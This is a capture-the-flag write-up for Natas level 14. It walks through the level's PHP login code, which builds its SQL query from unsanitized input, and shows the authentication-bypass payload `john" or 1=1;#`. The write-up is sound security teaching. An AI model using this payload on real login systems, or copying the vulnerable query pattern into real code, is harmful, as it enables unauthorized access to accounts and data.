# Level 14
This level deals with  SQL Injection Vulnerability

## Quest
We are presented with a simple sign in form
![Level 14 Image](./images/Level14.png)

Backend code for the page is below, Lets comment it
```php
<?
if(array_key_exists("username", $_REQUEST)) {  // Checks if username parameter exists in request
    $link = mysql_connect('localhost', 'natas14', '<censored>'); // Connect to db
    mysql_select_db('natas14', $link);
    
    // A query is run based on user input, no sanitization performed. Bad Practise !!
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {  // if 'debug' parameter is set, output query
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { // If our query return any rows, then success
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {  // Else, Access Denied
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```

## Solution
Before going into the solution, lets look at the request that is sent when we log in. (_captured in Burp_)
![Level 14 Solution](./images/Level14_solution.png)

Let look at this line :
```sql
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

If we enter both username and password as `admin`, our resulting query becomes:
```sql
SELECT * from users where username="admin" and password = "admin";
```
If above query produces any output (rows), then we log in, otherwise we get access denied.

Now, in order to do SQL injection we enter a basic payload -> `john" or 1=1;#`
Our query becomes
```sql
SELECT * from users where username="john" or 1=1;#" and password="";
```
Note: Above query is now reduced to `SELECT * from users where username="john" or 1=1;`, as `#` is a comment in mysql and anything after it is ignored. This will always produce an output as long there are any rows in `users` table because `1=1` is always true.

From Backend code:
```php
if(mysql_num_rows(mysql_query($query, $link)) > 0) { // If we found any table, then success
            echo "Successful login! The password for natas15 is <censored><br>";
    }
```
As now our query will produce an output, password for next Level will be revealed.

Below is the same thing in action.

1. We can see our request/response in Burp with our payload. (_it has been URL encoded_)
![Level14.1_solution](./images/Level14.1_solution.png)

<br/>

[<< Back](https://grey-fish.github.io/Natas/index.html)
